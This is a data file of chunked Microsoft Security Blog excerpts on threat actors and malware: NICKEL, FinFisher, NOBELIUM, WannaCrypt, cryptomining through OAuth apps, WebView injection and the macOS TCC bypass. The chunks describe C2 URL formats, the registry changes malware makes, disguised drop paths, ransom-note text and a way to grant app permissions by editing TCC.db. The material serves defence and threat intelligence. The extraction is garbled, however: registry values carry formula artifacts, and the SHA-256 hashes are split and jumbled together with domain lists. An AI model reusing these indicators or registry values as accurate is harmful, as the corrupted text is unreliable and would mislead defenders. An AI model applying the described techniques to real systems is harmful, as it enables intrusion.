frequent and scheduled data collection and exfiltration from victim networks. \nNICKEL successfully compromises networks using attacks on internet-facing web applications running on unpatched Microsoft Exchange and SharePoint. They also attack remote access infrastructure, such as unpatched VPN appliances, as \nreferenced in the FireEye April 2021 blog detailing a 0-day vulnerability in Pulse Secure VPN that has since been patched. \nAfter gaining an initial foothold on a compromised system, the NICKEL actors routinely performed reconnaissance on the network, working to gain access to additional accounts or higher-value systems. NICKEL typically deployed a keylogger to capture credentials from users on compromised systems. We've observed NICKEL using Mimikatz, WDigest (an older authentication method that allows the attacker access to credentials in clear text), NTDSDump, and other password dumping tools to gather credentials on a targeted system and from target browsers. \nDeploying malware for command and control MSTIC tracks multiple malware families used by NICKEL for command and control as Neoichor, Leeson, NumbIdea, NullItch, and Rokum. \nThe Leeson, Neoichor, and NumbIdea malware families typically use the Internet Explorer (IE) COM interface to connect and receive commands from hardcoded C2 servers. Due to their reliance on IE, these malware families intentionally configure the browser settings by modifying the following registry entries: \n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main]   \nStart Page $=$ \"about:blank\"   \nDisableFirstRunCustomize $\\mathit{\\Theta}=\\mathit{\\Theta}1$   \nRunOnceComplete $\\mathit{\\Theta}=\\mathit{\\Theta}^{1}$   \nRunOnceHasShown $\\mathit{\\Theta}=\\mathit{\\Theta}^{1}$   \nCheck_Associations $\\mathit{\\Theta}=\\mathit{\\Theta}1$ [HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery]   \nAutoRecover $=6$   \n[HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Privacy]   \nClearBrowsingHistoryOnExit $\\mathit{\\Theta}=\\mathit{\\Theta}1$ [HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Connection Wizard]   \nCompleted $\\mathit{\\Theta}=\\mathit{\\Omega}\\beth$ [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet   \nSettings\\ZoneMap]   \nIEHarden $=6$ \nWhen connecting to the C2 servers, the URL requests follow these formats: \nhttp[:]//<C2>?id=<5-digit-rand><system-specific-string> http[:]//<C2>?setssion $|==$ <rand><GetTickCount> http[:]//<C2>?newfrs%dsetssion $|=$ <rand><GetTickCount> http[:]//<C2>/index.htm?content $\\mathrel{\\mathop:}=$ <base64-system-specifc-string>&id= <num> \nA typical response from the C2 server is a legitimate-looking webpage containing the string \"!DOCTYPE html\", which the malware checks. The malware then locates a Base64-encoded blob, which it decodes and proceeds to load as a shellcode. \nFor the Neoichor family, the malware checks for internet connectivity by contacting bing.com with the request format bing.com?id $|=<$ <GetTickCount> and drops files as \\~atemp and \\~btemp containing error codes and debug resources. \nThe NICKEL implants are backdoors capable of collecting system information, such as: \nIP address   \nOS version   \nSystem language ID   \nComputer name   \nSigned-in username \nThey implement basic backdoor functionalities, including: \nLaunching a process \nUploading a file   \nDownloading a file   \nExecuting a shellcode in memory \nMSTIC has observed NICKEL drop their malware into existing installed software paths. They did this to make their malware appear to be files used for an installed application. The following are example paths: \nC:\\Program Files\\Realtek\\Audio\\HDA\\AERTSr.exe C:\\Program Files (x86)\\Foxit Software\\Foxit Reader\\FoxitRdr64.exe C:\\Program Files (x86)\\Adobe\\Flash Player\\AddIns\\airappinstaller\\airappinstall.exe C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd64.exe ", "source": "microsoft"}, {"title": "Defense", "content": "The following guidance can help mitigate the techniques and threat activity described in this blog: \nBlock legacy authentication protocols in Azure Active Directory \u2013 especially Exchange Web Services (EWS) Enable multi-factor authentication to mitigate compromised credentials. For Office 365 users, see multi-factor authentication support. For Consumer and Personal email accounts, see how to use two-step verification.   \nUse passwordless solutions like Microsoft Authenticator to secure accounts.   \nReview and enforce recommended Exchange Online access policies. O Block ActiveSync clients from bypassing Conditional Access policies.   \nBlock all incoming traffic from anonymizing services, where possible.   \nTurn on the following attack surface reduction rule to block or audit activity associated with this threat: Block credential stealing from the Windows local security authority subsystem (lsass.exe) ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "Type Indicator 02daf4544bcefb2de865d0b45fc406bee3630704be26a9d6da25c9ab   \nSHA-256 e906e7d2 0a45ec3da31838aa7f56e4cbe70d5b3b3809029f9159ff0235837e5b   \nSHA-256 7a4cb34c 0d7965489810446ca7acc7a2160795b22e452a164261313c634a652   \nSHA-256 9a0090a0c 10bb4e056fd19f2debe61d8fc5665434f56064a93ca0ec0bef946a4c3   \nSHA-256 e098b95 12d914f24fe5501e09f5edf503820cc5fe8b763827a1c6d44cdb705e4   \nSHA-256 8651b21 1899f761123fedfeba0fee6a11f830a29cd3653bcdcf70380b72a05b9   \nSHA-256 21b4b49 22e68e366dd3323e5bb68161b0938da8e1331e4f1c1819c8e84a97e   \nSHA-256 704d93844 259783405ec2cb37fdd8fd16304328edbb6a0703bc3d551eba252d9   \nSHA-256 b450554ef 26debed09b1bbf24545e3b4501b799b66a0146d4020f882776465b5   \nSHA-256 071e91822 35c5f22bb11f7dd7a2bb03808e0337cb7f9c0d96047b94c8afdab63ef   \nSHA-256 c0b9bb2 3ae2d9ffa4e53519e62cc0a75696f9023f9cce09b0a917f25699b48d0f   \nSHA-256 7c4838 3bac2e459c69fcef8c1c93c18e5f4f3e3102d8d0f54a63e0650072aeb2   \nSHA-256 a5fa65 3c0bf69f6faf85523d9e60d13218e77122b2adb0136ffebbad0f39f3e3   \nSHA-256 eed4e6 3dc0001a11d54925d2591aec4ea296e64f1d4fdf17ff3343ddeea82e9   \nSHA-256 bd5e4f1 \n9a47d54b 6b79b807a66c786bd2e57d1c761fc7e69dd9f790ffab7ce74086c4115 SHA-256 c9305ce 7944a86fbef6238d2a55c14c660c3a3d361c172f6b8fa490686cc8889 SHA-256 b7a51a0 SHA-256 926904f7c0da13a6b8689c36dab9d20b3a2e6d32f212fca9e5f8cf2c6 055333c 95e98c811ea9d212673d0e84046d6da94cbd9134284275195800278 SHA-256 593594b5a a142625512e5372a1728595be19dbee23eea50524b4827cb64ed5aa SHA-256 eaaa0270b afe5e9145882e0b98a795468a4c0352f5b1ddb7b4a534783c9e8fc36 SHA-256 6914cf6a b9027bad09a9f5c917cf0f811610438e46e42e5e984a8984b6d69206 SHA-256 ceb74124 c132d59a3bf0099e0f9f5667daf7b65dba66780f4addd88f04eecae47 SHA-256 d5d99fa SHA-256 c9a5765561f52bbe34382ce06f4431f7ac65bafe786db5de89c29748c f371dda ce0408f92635e42aadc99da3cc1cbc0044e63441129c597e7aa1d76bf SHA-256 2700c94 ce47bacc872516f91263f5e59441c54f14e9856cf213ca31284702176 SHA-256 55fc5e6 SHA-256 d0fe4562970676e30a4be8cb4923dc9bfd1fca8178e8e7fea0f3f02e0c 7435ce d5b36648dc9828e69242b57aca91a0bb73296292bf987720c73fcd3d SHA-256 2becbae6 e72d142a2bc49572e2d99ed15827fc27c67fc0999e90d4bf1352b075f SHA-256 86a83ba Domain name beesweiserdog[.]com Domain name bluehostfit[.]com Domain name business-toys[.]com Domain name cleanskycloud[.]com Domain name cumberbat[.]com Domain name czreadsecurity[.]com Domain name dgtresorgouv[.]com Domain name dimediamikedask[.]com Domain name diresitioscon[.]com Domain name elcolectador[.]com Domain name elperuanos[.]org Domain name eprotectioneu[.]com Domain name fheacor[.]com Domain name followthewaterdata[.]com Domain name francevrteepress[.]com Domain name futtuhy[.]com Domain name gardienweb[.]com Domain name heimflugaustr[.]com Domain name ivpsers[.]com Domain name jkeducation[.]org Domain name micrlmb[.]com Domain name muthesck[.]com Domain name netscalertech[.]com Domain name newgoldbalmap[.]com Domain name news-laestrella[.]com Domain name noticialif[.]com Domain name opentanzanfoundation[.]com Domain name optonlinepress[.]com Domain name palazzochigi[.]com \nDomain name pandemicacre[.]com Domain name papa-ser[.]com Domain name pekematclouds[.]com Domain name pipcake[.]com Domain name popularservicenter[.]com Domain name projectsyndic[.]com Domain name qsadtv[.]com Domain name sankreal[.]com Domain name scielope[.]com Domain name seoamdcopywriting[.]com Domain name slidenshare[.]com Domain name somoswake[.]com Domain name squarespacenow[.]com Domain name subapostilla[.]com Domain name suzukicycles[.]net Domain name tatanotakeeps[.]com Domain name tijuanazxc[.]com Domain name transactioninfo[.]net Domain name eurolabspro[.]com Domain name adelluminate[.]com Domain name headhunterblue[.]com Domain name primenuesty[.]com ", "source": "microsoft"}, {"title": "Introduction", "content": "In analyzing FinFisher, the first obfuscation problem that requires a solution is the removal of junk instructions and \"spaghetti code\", which is a technique that aims to confuse disassembly programs. Spaghetti code makes the program flow hard to read by adding continuous code jumps, hence the name. An example of FinFisher's spaghetti code is shown below. \nThis problem is not novel, and in common situations there are known reversing plugins that may help for this task. In the case of FinFisher, however, we could not find a good existing interactive disassembler (IDA) plugin that can normalize the code flow. So we decided to write our own plugin code using IDA Python. Armed with this code, we removed this first layer of anti-analysis protection. \nRemoving the junk instructions revealed a readable block of code. This code starts by allocating two chunks of memory: a global 1 MB buffer and one 64 KB buffer per thread. The big first buffer is used as index for multiple concurrent threads. A big chunk of data is extracted from the portable executable (PE) file itself and decrypted two times using a custom XOR algorithm. We determined that this chunk of data contains an array of opcode instructions ready to be interpreted by a custom virtual machine program (from this point on referenced generically as $^{\\prime\\prime}\\backslash{\\sf M}^{\\prime\\prime})$ implemented by FinFisher authors. ", "source": "microsoft"}, {"title": "Defense", "content": "Exposing as much of FinFisher's riddles as possible during this painstaking analysis has allowed us to ensure our customers are protected against this advanced piece of malware. \nWindows 10 S devices are naturally protected against FinFisher and other threats thanks to the strong code integrity policies that don't allow unknown unsigned binaries to run (thus stopping FinFisher's PE installer) or loaded (blocking FinFisher's DLL persistence). On Windows 10, similar code integrity policies can be configured using Windows Defender Application Control. \nOffice 365 Advanced Threat Protection secures mailboxes from email campaigns that use zero-day exploits to deliver threats like FinFisher. Office 365 ATP blocks unsafe attachments, malicious links, and linked-to files using time-of-click protection. Using intel from this research, we have made Office 365 ATP more resistant to FinFisher's anti-sandbox checks. \nGeneric detections, advanced behavioral analytics, and machine learning technologies in Windows Defender Advanced Threat Protection detect FinFisher's malicious behavior throughout the attack kill chain and alert SecOps personnel. Windows Defender ATP also integrates with the Windows protection stack so that protections from Windows Defender AV and Windows Defender Exploit Guard are \nFinFisher exposed: A researcher's tale of defeating traps, tricks, and complex virtual machines | Microsoft Security Blog reported in Windows Defender ATP portal, enabling SecOps personnel to centrally manage security, and as well as promptly investigate and respond to hostile activity in the network. \nWe hope that this writeup of our journey through all the multiple layers of protection, obfuscation, and anti-analysis techniques of FinFisher will be useful to other researchers studying this malware. We believe that an industry-wide collaboration and information-sharing is important in defending customers against this complex piece of malware. For further reading, we recommend these other great references: \nDevirtualizing FinSpy [PDF], Tora (2012)   \nFinfisher rootkit analysis, Artem Baranov (2017)   \nA Walk-Through Tutorial, with Code, on Statically Unpacking the FinSpy VM:   \nPart One, x86 Deobfuscation, Rolf Rolles (2018)   \nFinSpy VM Part 2: VM Analysis and Bytecode Disassembly, Rolf Rolles (2018)   \nESET's guide to deobfuscating and devirtualizing FinFisher [PDF], Filip Kafka   \n(2018) \nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. \nAndrea Allievi, Office 365 ATP Research team with Elia Florio, Windows Defender ATP Research team \nSample analyzed: \nMD5: a7b990d5f57b244dd17e9a937a41e7f5   \nSHA-1: c217d48c4ac1555491348721cc7cfd1143fe0b16   \nSHA-256:   \nb035ca2d174e5e4fd2d66fd3c8ce4ae5c1e75cf3290af872d1adb2658852afb ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft Threat Intelligence Center (MSTIC) is naming the actor behind the attacks against SolarWinds, the SUNBURST backdoor, TEARDROP malware, and related components as NOBELIUM. \nRecent investigations have identified three new pieces of malware being used in late-stage activity by NOBELIUM. This blog provides detailed analysis of these malware strains to help defenders detect, protect, and respond to this threat. We continue to partner with FireEye to understand these threats and protect our mutual customers. FireEye's analysis of the malware used by NOBELIUM is here. \nMicrosoft discovered these new attacker tools and capabilities in some compromised customer networks and observed them to be in use from August to September 2020. Further analysis has revealed these may have been on compromised systems as early as June 2020. These tools are new pieces of malware that are unique to this actor. They are tailor-made for specific networks and are assessed to be introduced after the actor has gained access through compromised credentials or the SolarWinds binary and after moving laterally with TEARDROP and other hands-on-keyboard actions. \nThese capabilities differ from previously known NOBELIUM tools and attack patterns, and reiterate the actor's sophistication. In all stages of the attack, the actor demonstrated a deep knowledge of software tools, deployments, security software and systems common in networks, and techniques frequently used by incident response teams. This knowledge is reflected in the actor's operational decisions, from the choice of command-and-control (C2) infrastructure to the naming of scheduled tasks used to maintain persistence. \nWith this actor's established pattern of using unique infrastructure and tooling for each target, and the operational value of maintaining their persistence on compromised networks, it is likely that additional components will be discovered as our investigation into the actions of this threat actor continues. ", "source": "microsoft"}, {"title": "Protection", "content": "The sophisticated NOBELIUM attack requires a comprehensive incident response to identify, investigate, and respond. Get the latest information and guidance from Microsoft at https://aka.ms/nobelium. \nMicrosoft Defender Antivirus detects the new NOBELIUM components discussed in this blog as the following malware: \nTrojan:Win64/GoldMax.A!dha TrojanDownloader:VBS/Sibot.A!dha Trojan:VBS/Sibot.B!dha Trojan:Win64/GoldFinder.A!dha Behavior:Win32/Sibot.C \nTurning on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus ensures that artificial intelligence and machine learning can quickly identify and stop new and unknown threats. Tamper protection features prevent attackers from stopping security services. Attack surface reduction rules, specifically the rule Block executable files from running unless they meet a prevalence, age, or trusted list criterion, can help block new malware and attacker tools introduced by threat actors. \nDetections of new malware by Microsoft Defender Antivirus are reported as alerts in Microsoft Defender Security Center. Additionally, endpoint detection and response capabilities in Microsoft Defender for Endpoint detect malicious behavior related to these NOBELIUM components, which are surfaced as alerts with the following titles: \nGoldMax malware Sibot malware GoldFinder Malware \nThe following alerts, which indicate detection of behavior associated with a wide range of attacks, are also raised for these NOBELIUM components: \nSuspicious connection to remote service Suspicious Rundll32 Process Execution Suspicious PowerShell command line Suspicious file or script accessed a malicious registry key \nIntelligence about these newly surfaced components accrue to the information about NOBELIUM that Microsoft 365 Defender consolidates. Rich investigation tools in Microsoft 365 Defender allow security operations teams to comprehensively respond to this attack. Get comprehensive guidance for using Microsoft 365 Defender to identify, investigate, and respond to the NOBELIUM attack. ", "source": "microsoft"}, {"title": "Introduction", "content": "The probabilistic model we discuss in this blog aids Microsoft Threat Experts analysts in sending quick, context-rich, threat actor-attributed notification to customers in the earliest stages of attacks. In one recent case, for example, the model surfaced high-confidence data indicating initial stages of a new ransomware actor in an organization just two minutes into the attack. This enabled analysts to quickly confirm the malicious behavior and the involved threat group, then send a targeted attack notification to the customer, who was able stop the threat before attackers can encrypt data and ask for ransom: \n1. The attacker compromises a device via Remote Desktop. This signal, one of many, starts the examination of the attack by the model, which knows that initial access via Remote Desktop is a technique often utilized by a certain threat actor.   \n2. Attackers copy common open-source tools and custom payloads to the device for such malicious activities as tampering with AV and credential theft, which would allow discovery and lateral movement. With these tools on the device, the model's confidence increases.   \n3. The attacker begins running the tools and exhibiting behaviors typically associated with attacks by the threat actor.   \n4. Just two minutes into the attack, the model hits a threshold for activity that indicates the suspected threat actor is present in the organization.   \n5. Microsoft Threat Experts analysts are notified of the suspected actor activity identified by model, and they quickly send a high-context targeted attack notification that includes technical information as well as actor attribution.   \n6. As the attacker was attempting to tamper with the antivirus solution, the organization stops the attack, armed with the knowledge of the likely forthcoming activity they need to stop. The threat actor is stopped from \nAutomating threat actor tracking: Understanding attacker behavior for intelligence and contextual alerting | Microsoft Security performing their other known TTPs, ultimately preventing the ransomware deployment and activation. \nThrough the automated threat actor tracking model, Microsoft Threat Experts analysts were able to equip the organization with information about the attack as it was unfolding. The model-enriched targeted attack notification enabled the customer to stop a known human-operated ransomware group before they could cause significant damage. If not stopped, the threat actor would have been able to perform its typical behaviors, including clearing of event logs, creating a persistence method, disabling and deleting backups and recovery options for the device, and encryption and ransom. ", "source": "microsoft"}, {"title": "Conclusion", "content": "Across Microsoft, we use statistical models and machine learning to uncover threats hidden in billions of low-fidelity signals. The threat actor tracking model we introduced in this blog is exciting work with real impact in customer protection. We are still in the early stages of realizing the value of this approach, yet we already have had much success, especially in detecting and informing customers about human-operated attacks, which are some of the most prevalent and impactful threats today. \nA core reason for this success is the combination of statistical expertise, threat hunting, and the very intensive work of vetting and discovering the combination of TTPs that indicate specific threat groups.  Our ability to automatically identify threat actors from the data, predict next steps, and stop attacks is foundational for much of our work going forward, with many as-yet unrealized benefits in customer protection. In real terms, we have accelerated threat hunting to drive to conclusions that lead to real protection, and we will continue expanding that protection for our customers through the Microsoft Threat Experts service and the coordinated defense delivered by Microsoft 365 Defender. ", "source": "microsoft"}, {"title": "Introduction", "content": "Microsoft observed the threat actor tracked as Storm-1283 using a compromised user account to create an OAuth application and deploy VMs for cryptomining. The compromised account allowed Storm-1283 to sign in via virtual private network (VPN), create a new single-tenant OAuth application in Microsoft Entra ID named similarly as the Microsoft Entra ID tenant domain name, and add a set of secrets to the application. As the compromised account had an ownership role on an Azure subscription, the actor also granted 'Contributor' role permission for the application to one of the active subscriptions using the compromised account. \nThe actor also leveraged existing line-of-business (LOB) OAuth applications that the compromised user account had access to in the tenant by adding an additional set of credentials to those applications. The actor initially deployed a small set of VMs in the same compromised subscriptions using one of the existing applications and initiated the cryptomining activity. The actor then later returned to deploy more VMs using the new application. Targeted organizations incurred compute fees ranging from 10,000 to 1.5 million USD from the attacks, depending on the actor's activity and duration of the attack. \nStorm-1283 looked to maintain the setup as long as possible to increase the chance of successful cryptomining activity. We assess that, for this reason, the actor used the naming convention [DOMAINNAME]_[ZONENAME]_[1-9] (the tenant name followed by the region name) for the VMs to avoid suspicion. \nOne of the ways to recognize the behavior of this actor is to monitor VM creation in Azure Resource Manager audit logs and look for the activity \"Microsoft.Compute/virtualMachines/write\" performed by an OAuth application. While the naming convention used by the actor may change in time, it may still include the domain name or region names like \"east|west|south|north|central|japan|france|australia|canada|korea|uk|poland|brazil\" \nMicrosoft Threat Intelligence analysts were able to detect the threat actor's actions and worked with the Microsoft Entra team to block the OAuth applications that were part of this attack. Affected organizations were also informed of the activity and recommended further actions. ", "source": "microsoft"}, {"title": "defend", "content": "Using Microsoft Defender for Cloud Apps connectors for Microsoft 365 and Azure, Microsoft Defender XDR raises the following alerts: \nStolen session cookie was used   \nActivity from anonymous IP address Activity from a password-spray associated IP address   \nUser added or updated a suspicious OAuth app   \nRisky user created or updated an app that was observed creating a bulk of Azure virtual machines in a short interval   \nRisky user updated an app that accessed email and performed email activity through Graph API   \nSuspicious creation of OAuth app by compromised user   \nSuspicious secret addition to OAuth app followed by creation of Azure virtual machines   \nSuspicious OAuth app creation   \nSuspicious OAuth app email activity through Graph API   \nSuspicious OAuth app-related activity by compromised user   \nSuspicious user signed into a newly created OAuth app   \nSuspicious addition of OAuth app permissions   \nSuspicious inbox manipulation rule   \nImpossible travel activity   \nMultiple failed login attempts ", "source": "microsoft"}, {"title": "defend", "content": "Microsoft Defender for Office 365 detects threat activity associated with this spamming campaign through the following email security alerts. Note, however, that these alerts may also be triggered by unrelated threat activity. We're listing them here because we recommend that these alerts be investigated and remediated immediately. \nA potentially malicious URL click was detected A user clicked through to a potentially malicious URL Suspicious email sending patterns detected User restricted from sending email Email sending limit exceeded ", "source": "microsoft"}, {"title": "Introduction", "content": "Exploitation of the vulnerability relies on the app's implementation of JavaScript interfaces, which are provided by a component of the Android operating system called WebView. WebView allows applications to load and display web pages and, using the addJavascriptInterface API call, can also provide bridge functionality that allows JavaScript code in the web page to invoke specific Java methods of a particular class in the app. Loading untrusted web content to WebView with application-level objects accessible via JavaScript code renders the application vulnerable to JavaScript interface injection, which may lead to data leakage, data corruption, or, in some cases, arbitrary code execution. \nIn our example, the code below demonstrates how a JavaScript interface is used, an instance of the JsObject class is injected into WebView (line 8) and it is referenced by the injectObject variable within the JavaScript code, which is loaded via the loadUrl API method (line 10): \nPrior to Android API level 18 (released in 2013 with Android 4.3), any method of the injected class was exposed to this JavaScript code. From API level 18 onwards, only class methods with the ${}^{\\prime\\prime}@$ JavascriptInterface\" annotation can be invoked (depicted above in line 2). ", "source": "microsoft"}, {"title": "Introduction", "content": "Blog home / Threat intelligence All Microsoft\ue70d Products\ue70d \nLight \nSearch the blog \n5 min read \nWhen Vulnerabilities are Exploited: the Timing of First Known Exploits for Remote Code Execution Vulnerabilities \nBy Tim Rains \nOne of the questions I get asked from time to time is about the days of risk between the time that a vulnerability is disclosed and when we first see active exploitation of it; i.e. how long do organizations have to deploy the update before active attacks are going to happen?  Trustworthy Computing's Security Science team published new data that helps put the timing of exploitation into perspective, in the recently released Microsoft Security Intelligence Report volume 16. \nThe Security Science team studied exploits that emerged for the most severe vulnerabilities in Microsoft software between 2006 and 2013. The exploits studied were for vulnerabilities that enable remote code execution. The timing of the release of the first known exploit for each remote code execution vulnerability was examined, and the results were put into three groups: \nZero day: the first exploit was discovered in the wild before a security update to address the vulnerability was released   \nWithin 30 days: the first exploit was discovered in the wild within 30 days following the release of the security update that addressed the vulnerability   \nAfter 30 days: the first exploit was discovered in the wild after the first 30 days following the release of the security update that addressed the vulnerability \nFigure 1 shows us that there was a 70 percent decline in the total number of remote code execution vulnerabilities that were exploited in Microsoft products between 2010 and 2013. This is likely a result of the continued evolution of security mitigations in Microsoft products, like Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP), that make it much harder and more expensive for attackers to develop reliable exploits for vulnerabilities. \nOf those vulnerabilities that do get exploited, the greatest potential risk comes from zero-day exploits, which are discovered in the wild before the publisher of the affected software is able to release a security update to address the vulnerability. Figure 1 illustrates that the number of zero-day exploits detected each year for severe vulnerabilities in Microsoft software decreased from its peak of 18 in 2011 to 13 in 2013. The rapidly shrinking number of remote code execution vulnerabilities that were exploited between 2010 and 2013 is good news, but subsequently zeroday exploits accounted for a larger proportion of the total number of exploits in each of the last three years. \nWith new remote code execution vulnerabilities becoming harder to find and exploit, as secure coding practices improve across the software industry, developing new exploits has become more expensive and the value of previously undisclosed exploits in the underground economy has increased. This reality provides \"black hat\" security researchers and exploit developers with a powerful incentive to maximize their own profits by selling exclusive access to a vulnerability and exploit to an attacker before the affected vendor has knowledge of the vulnerability and can issue a security update, and before security software vendors can update their detection signatures. \nBy contrast, remote code execution exploits that first appear more than 30 days after security update publication have become rare, with only one such instance in 2013. The number of exploits in the \"after 30 days\" category decreased from the peak of 11 in 2010 to 1 in 2013. A big part of this reduction is likely due to the work Microsoft and others in the industry have done to make it easier for customers to test and deploy updates quickly after release, even in large organizations. As the share of computers receiving updates within the first month of release continues to increase, exploiting older vulnerabilities becomes less profitable for attackers. \nThe number of remote code execution vulnerabilities exploited within the first 30 days after a security update has been released has also decreased substantially since 2010. In 2010, 42 exploits for severe vulnerabilities were first discovered in the 30 days after security updates for the vulnerabilities were released. But there has been a large reduction in this category of exploits in each subsequent year, 23 in 2011, 10 in 2012, and 6 in 2013. \nThere is likely a combination of reasons for the positive reduction in exploitation in all three categories First, as I mentioned earlier it is much harder to find and reliably exploit remote code execution vulnerabilities because of all the security mitigations layered into Microsoft software. Second, there has been increased usage of Microsoft Update and Windows Update services over the years, providing faster protection to more systems. Organizations have more sophisticated security update deployment and risk management methodologies supported by better and more efficient deployment technologies. Another contributing factor is the parties that are using the exploits and what is motivating them. You can get more insight into this aspect from an article I recently published called \"Who Exploits Vulnerabilities: the Path from Disclosure to Mass Market Exploitation.\" This data shows us that of the 16 remote code execution vulnerabilities studied, that were known to be exploited between January 2012 and February 2014, the majority of them (9 of the 16) were initially exploited in targeted attacks against specific targets. Attempted mass exploitation using the same exploits via exploit kits occurred months after the security updates that addressed the vulnerabilities were published and widely distributed. ", "source": "microsoft"}, {"title": "Summary", "content": "Effective security mitigations in Windows, and changing vulnerability market economics have contributed to a rapid reduction (70 percent reduction) in the number of remote code execution vulnerabilities that were exploited in Microsoft software over the past three years   \nIn 2013 there were 20 remote code execution vulnerabilities in Microsoft software that were known to be exploited, down from 70 in 2010   \nThere have been relatively large positive reductions in the number of zero day exploits, vulnerabilities exploited within the first 30 days after a security update is released and vulnerabilities exploited more than 30 days after a security update is released. 13 zero day exploits in 2013, down 28 percent from 2011 6 remote code execution vulnerabilities exploited within 30 days of the security update being released, an 86 percent reduction from 2010 1 remote code execution vulnerability exploited more than 30 days after of the release of a security update, a 91 percent reduction from 2010 ", "source": "microsoft"}, {"title": "Introduction", "content": "Hau la bum hilaaia.t \nResearch Threat intelligence Ransomware \nYour important fles are encrypted.   \nMany of your documents, photos, videos, databases and other fles are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption trial ", "source": "microsoft"}, {"title": "Protection", "content": "To get the latest protection from Microsoft, upgrade to Windows 10. Keeping your computers up-to-date gives you the benefits of the latest features and proactive mitigations built into the latest versions of Windows. \nWe recommend customers that have not yet installed the security update MS17- 010 do so as soon as possible. Until you can apply the patch, we also recommend two possible workarounds to reduce the attack surface: \nDisable SMBv1 with the steps documented at Microsoft Knowledge Base Article 2696547 and as recommended previously Consider adding a rule on your router or firewall to block incoming SMB traffic on port 445 \nWindows Defender Antivirus detects this threat as Ransom:Win32/WannaCrypt as of the 1.243.297.0 update. Windows Defender Antivirus uses cloud-based protection, helping to protect you from the latest threats. \nFor enterprises, use Device Guard to lock down devices and provide kernel-level virtualization-based security, allowing only trusted applications to run, effectively preventing malware from running. \nUse Office 365 Advanced Threat Protection, which has machine learning capability that blocks dangerous email threats, such as the emails carrying ransomware. \nMonitor networks with Windows Defender Advanced Threat Protection, which alerts security operations teams about suspicious activities. \nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free trial. ", "source": "microsoft"}, {"title": "Indicators of compromise", "content": "SHA1 of samples analyzed: \n51e4307093f8ca8854359c0ac882ddca427a813c e889544aff85ffaf8b0d0da705105dee7c97fe26 \nFiles created: \n%SystemRoot%\\mssecsvc.exe   \n%SystemRoot%\\tasksche.exe   \n%SystemRoot%\\qeriuwjhrf   \nb.wnry   \nc.wnry   \nf.wnry   \nr.wnry   \ns.wnry   \nt.wnry   \nu.wnry   \ntaskdl.exe   \ntaskse.exe   \n00000000.eky   \n00000000.res   \n00000000.pky $@$ WanaDecryptor $@$ .exe $@$ Please_Read_Me@.txt m.vbs $@$ WanaDecryptor $@$ .exe.lnk $@$ WanaDecryptor $@$ .bmp   \n274901494632976.bat   \ntaskdl.exe   \nTaskse.exe   \nFiles with \".wnry\" extension   \nFiles with \".WNCRY\" extension \nRegistry keys created: \nHKLM\\SOFTWARE\\WanaCrypt0r\\wd \nKarthik Selvaraj, Elia Florio, Andrea Lelli, and Tanmay Ganacharya (@tanmayg) Microsoft Malware Protection Center (@msftmmpc) \nRelated blog entries: \nWindows 10 Creators Update provides next-gen ransomware protection \nAnalysis of the ETERNALBLUE and ETERNALROMANCE exploits leaked by Shadow Brokers \nUpdates: \nJune 20, 2017 \u2013 added reference to analysis of exploits leaked by Shadow Brokers ", "source": "microsoft"}, {"title": "Introduction", "content": "As mentioned earlier, TCC is a technology that prevents apps from accessing users personal information without their prior consent and knowledge. The user commonly manages it under System Preferences in macOS (System Preferences $>$ Security & Privacy $>$ Privacy): \nNew macOS vulnerability, \"powerdir,\" could lead to unauthorized user data access | Microsoft Security Blog TCC maintains databases that contain consent history for app requests. Generally, when an app requests access to protected user data, one of two things can happen: \n1. If the app and the type of request have a record in the TCC databases, then a flag in the database entry dictates whether to allow or deny the request without automatically and without any user interaction. 2. If the app and the type of request do not have a record in the TCC databases, then a prompt is presented to the user, who decides whether to grant or deny access. The said decision is backed into the databases so that succeeding similar requests will now fall under the first scenario. \nUnder the hood, there are two kinds of TCC databases. Each kind maintains only a subset of the request types: \nUser-specific database: contains stored permission types that only apply to the specific user profile; it is saved under \\~/Library/Application Support/com.apple.TCC/TCC.db and can be accessed by the user who owns the said profile System-wide database: contains stored permission types that apply on a system level; it is saved under /Library/Application Support/com.apple.TCC/TCC.db and can be accessed by users with root or full disk access \nmacOS implements the TCC logic by using a special daemon called tccd. Indeed, there are at least two instances of tccd: one run by the user and the other by root. \nEach type of request starts with a kTCCService prefix. While not an exhaustive list, below are some examples: \nIt should also be noted that the TCC.db file is a SQLITE database, so if a full disk access is granted to a user, they can view the database and even edit it: \nThe database columns are self-explanatory, save for the csreq column. The csreq values contain a hexadecimal blob that encodes the code signing requirements for the app. These values can be calculated easily with the codesign and csreq utilities, as seen in Figure 4 below: \nGiven these, should a malicious actor gain full disk access to the TCC databases, they could edit it to grant arbitrary permissions to any app they choose, including their own malicious app. The affected user would also not be prompted to allow or deny the said permissions, thus allowing the app to run with configurations they may not have known or consented to. ", "source": "microsoft"}, {"title": "defend", "content": "Our research on the powerdir vulnerability is yet another example of the tight race between software vendors and malicious actors: that despite the continued efforts of the former to secure their applications through regular updates, other \nNew macOS vulnerability, \"powerdir,\" could lead to unauthorized user data access | Microsoft Security Blog vulnerabilities will inevitably be uncovered, which the latter could exploit for their own gain. And as system vulnerabilities are possible entry points for attackers to infiltrate an organization's network, comprehensive protection is needed to allow security teams to manage vulnerabilities and threats across all platforms. \nMicrosoft Defender for Endpoint is an industry-leading, cloud-powered endpoint security solution that lets organizations manage their heterogeneous computing environments through a unified security console. Its threat and vulnerability management capabilities empower defenders to quickly discover, prioritize, and remediate misconfigurations and vulnerabilities, such as the powerdir vulnerability. In addition, Defender for Endpoint's unparalleled threat optics are built on the industry's deepest threat intelligence and backed by world-class security experts who continuously monitor the threat landscape. \nOne of the key strengths of Defender for Endpoint is its ability to generically detect and recognize malicious behavior. For example, as seen in the previous section, our POC exploits conduct many suspicious activities, including: \nDropping a new TCC.db file with an appropriate directory 